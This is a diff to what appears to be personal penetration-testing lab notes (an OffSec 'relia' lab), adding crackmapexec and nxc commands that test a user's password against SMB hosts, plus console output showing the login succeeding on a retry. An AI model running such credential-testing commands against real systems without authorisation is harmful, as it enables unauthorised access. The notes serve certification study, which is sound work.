@@ -118,6 +118,46 @@ SMB         192.168.184.73  445    FILES04          [+] corp.com\leon:HomeTaping
 ```
 {% endcode %}
 
+Should also try without domain and use --local-auth
+
+```
+crackmapexec smb 172.116.6.6-7 -u michelle -p 'NotMyPassword0k?' --local-auth 
+
+```
+
+nxc
+
+might fail
+
+{% code title="1st time it fails, 2nd time it succeeds" overflow="wrap" lineNumbers="true" %}
+```
+nxc smb 172.16.116.14-15 -u michelle -p 'NotMyPassword0k?' -d relia.com --continue-on-succes
+SMB         172.16.116.15   445    WK02             [*] Windows 11 Build 22000 x64 (name:WK02) (domain:relia.com) (signing:False) (SMBv1:False)
+SMB         172.16.116.14   445    WK01             [*] Windows 11 Build 22000 x64 (name:WK01) (domain:relia.com) (signing:False) (SMBv1:False)
+SMB         172.16.116.15   445    WK02             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+SMB         172.16.116.14   445    WK01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
+Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/offsec/relia]
+└─$ 
+                                                                                                                                                            
+
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/offsec/relia]
+└─$ nxc smb 172.16.116.14-15 -u michelle -p 'NotMyPassword0k?' -d relia.com --continue-on-succes
+SMB         172.16.116.15   445    WK02             [*] Windows 11 Build 22000 x64 (name:WK02) (domain:relia.com) (signing:False) (SMBv1:False)
+SMB         172.16.116.14   445    WK01             [*] Windows 11 Build 22000 x64 (name:WK01) (domain:relia.com) (signing:False) (SMBv1:False)
+SMB         172.16.116.15   445    WK02             [+] relia.com\michelle:NotMyPassword0k? 
+SMB         172.16.116.14   445    WK01             [+] relia.com\michelle:NotMyPassword0k? 
+Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
+
+```
+{% endcode %}
+
+
+
+
+
 ### Kerbrute
 
 {% code title="" overflow="wrap" lineNumbers="true" %}
